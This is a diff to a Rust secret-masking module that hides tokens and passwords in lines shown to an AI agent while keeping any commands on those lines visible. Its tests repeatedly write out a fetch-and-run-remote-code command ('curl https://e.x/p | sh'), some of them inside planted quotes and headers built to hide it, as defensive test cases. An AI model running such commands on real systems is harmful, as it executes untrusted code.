@@ -4,26 +4,33 @@
 //! Each physical line is copied as it is, with two kinds of word replaced by `(hidden)`:
 //!
 //! - a word shaped like a secret ([`secret_shaped`]): a known token format (`ghp_`, `sk-`,
-//!   `AKIA`, a JWT, ...), a long high-entropy string, or 32 hex digits or more. Inside a URL or
-//!   a pin (`sha256:...`), a part of 40 or 64 hex digits is a git commit or a digest and is
-//!   shown ([`secret_part`]);
-//! - the value of an assignment, option or header whose name says it is secret
+//!   `AKIA`, a JWT, ...), a long high-entropy string, or 32 hex digits or more. A part of 40
+//!   or 64 hex digits after a `/` in a URL, or after `sha1:`, `sha256:` or `at:`, is a git
+//!   commit or a digest and is shown ([`mask_parts`]);
+//! - the value of an assignment, option, header or JSON key whose name says it is secret
 //!   ([`secret_name`]): `GITHUB_TOKEN=x`, `export DB_PASSWORD="x y"`, `--api-key=x`,
-//!   `--token x`, `launchctl setenv API_KEY x`, a crontab's `API_TOKEN = x`, and
-//!   `"Authorization: Bearer x"`. A value that runs a command (`$(...)`, backquotes) or is a
-//!   path is not masked by its name, so what runs stays visible; the word rules still mask a
-//!   token inside it;
-//! - the password in a URL (`postgres://app:x@db`).
+//!   `--token x`, `launchctl setenv API_KEY x`, a crontab's `API_TOKEN = x`,
+//!   `"Authorization: Bearer x"` and `{"password":"x"}`. Not masked by its name: a value that
+//!   would hold a shell operator (`;`, `|`, `&`, `$(`, a backquote), which is code or a quote
+//!   the scan misread; a path (`/`, `~/`, `./`); and a bare reference to another variable
+//!   (`$TMPDIR/agent.sock`). The word rules still mask a token inside any of them;
+//! - the password in a URL (`postgres://app:x@db`), and a token as its user
+//!   (`https://<token>@github.com`).
+//!
+//! The invariant that keeps a line's commands visible: a masked run never holds a shell
+//! operator. A word holds none (they break words), and a name's value that would is shown.
 //!
 //! No shell is parsed, and nothing carries from one line to the next (owner's decision,
 //! 2026-11-18). The first design hid the value of every assignment, which needs a shell lexer;
 //! five reviews in a row found lines where it read the shell differently from zsh or bash, and
 //! each difference either leaked a token into the bundle or let a planted line (`# TOKEN="`)
-//! hide a later command from the agent. Masking words cannot hide a line, so the second can no
-//! longer happen. Accepted downside: a short password under an innocent name (`DB=hunter2`)
-//! or passed as a bare argument (`mysql -phunter2`, `sshpass -p hunter2`) is shown, and so is
-//! a key split over lines whose lines are short, and a capability URL whose secret is a UUID
-//! (`hc-ping.com/<uuid>`): UUIDs name too many harmless things to mask by shape.
+//! hide a later command from the agent. Masking cannot hide a line, nor a command on its own
+//! line (see the invariant above), so the second can no longer happen. Accepted downside: a
+//! short password under an innocent name (`DB=hunter2`) or passed as a bare argument
+//! (`mysql -phunter2`, `sshpass -p hunter2`) is shown, and so is a key split over lines whose
+//! lines are short, a quoted password that holds a shell operator, and a capability URL whose
+//! secret is a UUID (`hc-ping.com/<uuid>`): UUIDs name too many harmless things to mask by
+//! shape.
 
 /// What replaces a masked word.
 const HIDDEN: &str = "(hidden)";
@@ -161,19 +168,34 @@ fn mask_parts(word: &str) -> String {
     if let Some((before, after)) = url_password(word) {
         return format!("{}{HIDDEN}{}", mask_parts(before), mask_parts(after));
     }
+    let url = word.contains("://");
     let mut out = String::with_capacity(word.len());
     let mut start = 0;
-    for (at, c) in word
+    let mut before: Option<(char, &str)> = None;
+    let separators = word
         .char_indices()
         .filter(|(_, c)| matches!(c, '/' | ':' | '@'))
-    {
+        .map(|(at, c)| (at, Some(c)))
+        .chain(std::iter::once((word.len(), None)));
+    for (at, separator) in separators {
         let part = &word[start..at];
-        out.push_str(if secret_part(part) { HIDDEN } else { part });
-        out.push(c);
-        start = at + c.len_utf8();
+        // A pin: after a `/` in a URL, or after a `sha1:`, `sha256:` or `at:` label.
+        let pinned = match before {
+            Some(('/', _)) => url,
+            Some((':', label)) => matches!(label, "sha1" | "sha256" | "at"),
+            _ => false,
+        };
+        out.push_str(if secret_part(part, pinned) {
+            HIDDEN
+        } else {
+            part
+        });
+        if let Some(separator) = separator {
+            out.push(separator);
+            before = Some((separator, part));
+            start = at + separator.len_utf8();
+        }
     }
-    let last = &word[start..];
-    out.push_str(if secret_part(last) { HIDDEN } else { last });
     out
 }
 
@@ -193,7 +215,7 @@ fn url_password(word: &str) -> Option<(&str, &str)> {
         (!secret.is_empty() && !port).then(|| (&word[..=colon], &word[at..]))
     } else {
         let user = &word[start..at];
-        let token = !user.contains('/') && (secret_shaped(user) || (user.len() >= 32 && hex(user)));
+        let token = !user.contains('/') && secret_shaped(user);
         token.then(|| (&word[..start], &word[at..]))
     }
 }
@@ -203,6 +225,17 @@ fn hex(text: &str) -> bool {
     text.bytes().all(|b| b.is_ascii_hexdigit())
 }
 
+/// How a secret value ends, by the form its name was found in.
+#[derive(Debug, Clone, Copy)]
+enum Form {
+    /// A shell word ([`word_len`]).
+    Word,
+    /// A header inside quotes, which ends at this quote.
+    Header(u8),
+    /// A JSON value.
+    Json,
+}
+
 /// Where a secret value starts and ends.
 #[derive(Debug)]
 struct Span {
@@ -210,14 +243,13 @@ struct Span {
     end: usize,
 }
 
-/// The value of a secret-named assignment, option or header that starts at byte `at`, which
-/// must start a word: `NAME=value` or `NAME+=value` (after `export` and the like, or anywhere
-/// on the line), `NAME = value` at the start of a line (a crontab's), `--name=value`,
-/// `--name value`, `launchctl setenv NAME value`, `"Name: value"` (a header, inside quotes
-/// only), or `"name":"value"` (JSON). The value runs to its closing quote when it starts with
-/// one (or to the end of the line when none closes it), a header's to its own quote, and
-/// otherwise to the next white space, quote, `;`, `&` or `|`. A value that runs a command, is
-/// a path, or refers to another variable gives `None` (see the module docs).
+/// The value of a secret-named assignment, option, header or JSON key that starts at byte
+/// `at`, which must start a word or follow `?`, `:` or `/`: `NAME=value` or `NAME+=value`
+/// (after `export` and the like, or anywhere on the line), `NAME = value` at the start of a
+/// line (a crontab's), `--name=value`, `--name value`, `launchctl setenv NAME value`,
+/// `"Name: value"` (a header, inside quotes only, ending at its quote), or `"name":"value"`
+/// (JSON). Otherwise the value is a shell word ([`word_len`]). A value that would hold a shell
+/// operator, is a path, or is a bare reference gives `None` (see the module docs).
 fn secret_value_at(line: &str, at: usize) -> Option<Span> {
     let bytes = line.as_bytes();
     // A name also starts after `?`, `:` or `/`: a query (`?token=x`) or npm's
@@ -244,19 +276,19 @@ fn secret_value_at(line: &str, at: usize) -> Option<Span> {
         .map(|b| bytes[b])
         .filter(|b| matches!(b, b'"' | b'\''));
     let json = quote.and_then(|q| after.strip_prefix(char::from(q))?.strip_prefix(':'));
-    let (separator, header) = if let Some(rest) = after.strip_prefix("+=") {
-        (line.len() - rest.len(), None)
+    let (separator, form) = if let Some(rest) = after.strip_prefix("+=") {
+        (line.len() - rest.len(), Form::Word)
     } else if let Some(rest) = after.strip_prefix('=') {
-        (line.len() - rest.len(), None)
+        (line.len() - rest.len(), Form::Word)
     } else if let Some(rest) = spaced.strip_prefix('=').filter(|_| line_start) {
         let rest = rest.trim_start_matches([' ', '\t']);
-        (line.len() - rest.len(), None)
+        (line.len() - rest.len(), Form::Word)
     } else if let (Some(q), Some(rest)) = (quote, after.strip_prefix(':')) {
         let rest = rest.trim_start_matches([' ', '\t']);
-        (line.len() - rest.len(), Some(q))
+        (line.len() - rest.len(), Form::Header(q))
     } else if let Some(rest) = json {
         let rest = rest.trim_start_matches([' ', '\t']);
-        (line.len() - rest.len(), None)
+        (line.len() - rest.len(), Form::Json)
     } else if dashes > 0 || line[..at].trim_end().ends_with("setenv") {
         // `--token x` and `launchctl setenv TOKEN x`: the next word is the value, unless it is
         // another option or an operator (`--password-stdin -u me`).
@@ -264,30 +296,30 @@ fn secret_value_at(line: &str, at: usize) -> Option<Span> {
         if none || spaced.starts_with(['-', '<', '>', '|']) {
             return None;
         }
-        (line.len() - spaced.len(), None)
+        (line.len() - spaced.len(), Form::Word)
     } else {
         return None;
     };
     let value = &line[separator..];
-    let len = match header {
+    let len = match form {
         // Never past the header's own quote, so the rest of the line stays as written.
-        Some(q) => value.find(char::from(q)).unwrap_or(value.len()),
-        // `$'...'`, ANSI-C quoting: a quoted literal.
-        None if value.starts_with("$'") => value[2..].find('\'').map_or(value.len(), |at| at + 3),
-        None => match value.chars().next() {
-            Some(quote @ ('"' | '\'')) => value[1..].find(quote).map_or(value.len(), |at| at + 2),
-            _ => value
-                .find([' ', '\t', ';', '&', '|', '"', '\''])
-                .unwrap_or(value.len()),
+        Form::Header(q) => value.find(char::from(q)).unwrap_or(value.len()),
+        // A JSON value: its quoted string, or a bare one up to `,` or `}`.
+        Form::Json => match value.strip_prefix('"') {
+            Some(inner) => inner.find('"').map_or(value.len(), |end| end + 2),
+            None => value.find([',', '}', ' ']).unwrap_or(value.len()),
         },
+        Form::Word => word_len(value),
     };
     let shown = &value[..len];
     let unquoted = shown.trim_start_matches(['"', '\'']);
-    let runs = shown.contains("$(") || shown.contains('`');
-    // A path, or a reference to another variable (`$TMPDIR/agent.sock`), holds no secret of
-    // its own and may say what runs. `$'...'` is ANSI-C quoting, a literal.
-    let path = unquoted.starts_with(['/', '~', '.']);
-    let reference = unquoted.starts_with('$') && !unquoted.starts_with("$'");
+    // The invariant (module docs): a masked run never holds a shell operator, which would make
+    // it code, or a quote the scan misread that runs past the value.
+    let runs = shown.contains("$(") || shown.contains(['`', ';', '|', '&', '\n']);
+    let path = unquoted.starts_with('/')
+        || unquoted == "~"
+        || ["~/", "./", "../"].iter().any(|p| unquoted.starts_with(p));
+    let reference = is_reference(unquoted.trim_end_matches(['"', '\'']));
     if runs || path || reference {
         return None;
     }
@@ -295,6 +327,77 @@ fn secret_value_at(line: &str, at: usize) -> Option<Span> {
         value: separator,
         end: separator + len,
     })
+}
+
+/// The length of the shell word `value` starts with: unquoted runs and quoted parts (`'...'`,
+/// `"..."`, `$'...'`, `$"..."`) joined, up to white space, `;`, `&` or `|`. A quote that opens
+/// the value and does not close runs to the end of the line, where the operator invariant
+/// (module docs) still applies; one that does not close after other text is the closing quote
+/// of a string around the assignment (`"...?token=x"`), and the word ends before it.
+fn word_len(value: &str) -> usize {
+    let mut len = 0;
+    loop {
+        let rest = &value[len..];
+        let opener = if rest.starts_with("$'") || rest.starts_with("$\"") {
+            2
+        } else {
+            1
+        };
+        let quote = rest[opener - 1..]
+            .chars()
+            .next()
+            .filter(|c| matches!(c, '"' | '\''));
+        let quoted = quote.filter(|_| opener == 1 || rest.starts_with('$'));
+        if let Some(q) = quoted {
+            match rest[opener..].find(q) {
+                Some(end) => len += opener + end + 1,
+                None if len == 0 => return value.len(),
+                None => return len,
+            }
+            continue;
+        }
+        let end = rest
+            .find([' ', '\t', ';', '&', '|', '"', '\''])
+            .unwrap_or(rest.len());
+        // A `$` right before a quote opens `$'...'` or `$"..."`, taken on the next turn.
+        let end = if end > 0 && rest[..end].ends_with('$') && end < rest.len() {
+            end - 1
+        } else {
+            end
+        };
+        if end == 0 {
+            return len;
+        }
+        len += end;
+    }
+}
+
+/// Whether `value` is a bare reference to another variable, which holds no literal of its own:
+/// `$NAME` or `${NAME}`, alone or followed by a path (`$TMPDIR/agent.sock`). A default or
+/// anything after it (`${T:-x}`, `${T}x`) holds a literal and is not one.
+fn is_reference(value: &str) -> bool {
+    let Some(rest) = value.strip_prefix('$') else {
+        return false;
+    };
+    let after = if let Some(braced) = rest.strip_prefix('{') {
+        let Some(end) = braced.find('}') else {
+            return false;
+        };
+        let name = &braced[..end];
+        if name.is_empty() || !name.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_') {
+            return false;
+        }
+        &braced[end + 1..]
+    } else {
+        let len = rest
+            .find(|c: char| !(c.is_ascii_alphanumeric() || c == '_'))
+            .unwrap_or(rest.len());
+        if len == 0 {
+            return false;
+        }
+        &rest[len..]
+    };
+    after.is_empty() || after.starts_with('/')
 }
 
 /// Whether a name says its value is secret: one of its segments, split at `_` and `-` and
@@ -325,7 +428,7 @@ fn secret_shaped(word: &str) -> bool {
     // Mailgun's keys: `key-` and 32 hex digits.
     let mailgun = word
         .strip_prefix("key-")
-        .is_some_and(|rest| rest.len() == 32 && rest.bytes().all(|b| b.is_ascii_hexdigit()));
+        .is_some_and(|rest| rest.len() == 32 && hex(rest));
     let jwt = word.starts_with("eyJ") && word.split('.').count() == 3 && word.len() >= 30;
     let digits = word.strip_prefix("0x").unwrap_or(word);
     let long_hex = digits.len() >= 32 && hex(digits);
@@ -347,13 +450,13 @@ fn secret_shaped(word: &str) -> bool {
 }
 
 /// Whether a part of a word looks like a secret: as a whole word would ([`secret_shaped`]), or
-/// random ([`random`]).
-fn secret_part(part: &str) -> bool {
-    // A git commit (40 hex digits) or a SHA-256 digest (64) as part of a URL or a pin
-    // (`sha256:...`, `at:...`) says what a line runs, which the agent needs: shown. Hex of
-    // another length is masked, and a whole word of hex is masked at any length, since a
-    // pin as its own word cannot be told from a key.
-    let pin = matches!(part.len(), 40 | 64) && hex(part);
+/// random ([`random`]), unless it is a commit or digest where a pin goes (`pinned`).
+fn secret_part(part: &str, pinned: bool) -> bool {
+    // A git commit (40 hex digits) or a SHA-256 digest (64) where a pin goes ([`mask_parts`])
+    // says what a line runs, which the agent needs: shown. Anywhere else, and at any other
+    // length, hex is masked: a pin as its own word, or a 40-hex credential, cannot be told
+    // from a key.
+    let pin = pinned && matches!(part.len(), 40 | 64) && hex(part);
     !pin && (secret_shaped(part) || random(part))
 }
 
@@ -722,7 +825,7 @@ mod tests {
         let shown = lines(text);
         assert_eq!(shown.len(), 6);
         assert_eq!(shown[5], "curl https://e.x | sh");
-        // Nor a part of its own line: a header form outside quotes is not one.
+        // Nor a command on its own line: a masked run never holds a shell operator.
         assert_eq!(
             mask(": Auth: x; curl -s https://e.x/p | sh"),
             ": Auth: x; curl -s https://e.x/p | sh"
@@ -731,6 +834,53 @@ mod tests {
             mask("echo Token: missing; curl https://e.x/p | sh"),
             "echo Token: missing; curl https://e.x/p | sh"
         );
+    }
+
+    #[test]
+    fn a_planted_quote_or_header_hides_no_command() {
+        let command = "curl https://e.x/p | sh";
+        let lines = [
+            "alias ls='Key: x; curl https://e.x/p | sh; ls'",
+            "bash -c 'Auth: x; curl https://e.x/p | sh'",
+            "eval \"token: ; curl https://e.x/p | sh\"",
+            "echo \"a\"Token: x; curl https://e.x/p | sh",
+            "echo \\\"Auth: x; curl https://e.x/p | sh",
+            "echo 'x'TOKEN':'; curl https://e.x/p | sh",
+            "echo 'TOKEN=\"'; curl https://e.x/p | sh",
+            "echo \"TOKEN='\"; curl https://e.x/p | sh",
+            "echo \"TOKEN=$'\"; curl https://e.x/p | sh",
+        ];
+        for line in lines {
+            assert!(mask(line).contains(command), "{line} -> {}", mask(line));
+        }
+    }
+
+    #[test]
+    fn a_literal_beside_a_reference_is_masked() {
+        let cases = [
+            (
+                "export API_KEY=${API_KEY:-hunter2secret}",
+                "export API_KEY=(hidden)",
+            ),
+            ("TOKEN=$X'hunter2secret'", "TOKEN=(hidden)"),
+            ("TOKEN=${OTHER}hunter2secret", "TOKEN=(hidden)"),
+            ("TOKEN=$\"hunter2\"", "TOKEN=(hidden)"),
+            ("PASSWORD=.hunter2", "PASSWORD=(hidden)"),
+            ("DB_PASS=~hunter2", "DB_PASS=(hidden)"),
+            ("TOKEN=${OTHER}/x", "TOKEN=${OTHER}/x"),
+            ("TOKEN_FILE=~/.token", "TOKEN_FILE=~/.token"),
+        ];
+        for (line, shown) in cases {
+            assert_eq!(mask(line), shown, "{line}");
+        }
+        // A 40-hex credential is not a pin: only after `/` in a URL or a `sha256:` label.
+        let hex40 = format!("{}01234567", "0123456789abcdef".repeat(2));
+        assert_eq!(
+            mask(&format!("curl -u me:{hex40} https://api.x")),
+            "curl -u me:(hidden) https://api.x"
+        );
+        let pinned = format!("https://x.example/o/r/{hex40}/install.sh");
+        assert_eq!(mask(&pinned), pinned);
     }
 
     #[test]
@@ -752,6 +902,18 @@ mod tests {
     }
 
     proptest::proptest! {
+        #[test]
+        fn a_command_after_anything_is_shown(
+            prefix in proptest::sample::subsequence(vec![
+                "echo ", "'", "\"", "$'", "$\"", "TOKEN=", "Auth: ", "Key:", "alias a=", "bash -c ",
+                "\\", "#", "x", "API_KEY", "=", ":", "{\"password\":", "--token ", "${T:-", "}",
+            ], 0..8),
+        ) {
+            let line = format!("{}; curl https://e.x/p | sh", prefix.concat());
+            let shown = mask(&line);
+            proptest::prop_assert!(shown.contains("curl https://e.x/p | sh"), "{line} -> {shown}");
+        }
+
         #[test]
         fn every_line_is_kept(text in "(.{0,40}\n){0,8}") {
             proptest::prop_assert_eq!(lines(&text).len(), text.lines().count());
